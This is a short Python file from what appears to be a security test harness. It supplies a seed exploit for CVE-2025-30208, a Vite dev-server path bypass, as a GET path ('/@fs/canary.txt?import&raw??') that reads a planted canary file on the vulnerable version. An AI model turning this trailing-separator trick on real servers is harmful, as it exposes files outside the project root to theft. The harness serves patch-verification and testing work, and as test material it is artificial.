#!/usr/bin/env python3
"""[GIVEN] CVE-2025-30208 seed exploit — Vite dev-server server.fs.deny/allow bypass.

The `?raw??` / `?import&raw??` trailing-separator trick made Vite's query-string
regexes fail to strip the trailing separator, so the id used for the fs allow/deny
check differed from the path actually read by the `raw` loader. This let the
`/@fs/<abs>` middleware return files OUTSIDE the project root (the planted canary
at /canary.txt).

Contract: reaches the canary on V0 (vite 5.4.14); BLOCKED on V1 (vite 5.4.15),
where the CVE-2025-30208 patch accounts for the trailing separator in the query
regex. This is the seed the system-under-test is given.
"""
from __future__ import annotations

# Absolute-path file read via /@fs/, with the CVE-2025-30208 trailing-`?` trick.
PATH = "/@fs/canary.txt?import&raw??"


def candidate() -> dict:
    """The request candidate (candidate_schema.json shape) for this seed."""
    return {"probe_id": "cve-2025-30208-raw-double-question", "method": "GET", "path": PATH}


if __name__ == "__main__":
    print(candidate()["path"])
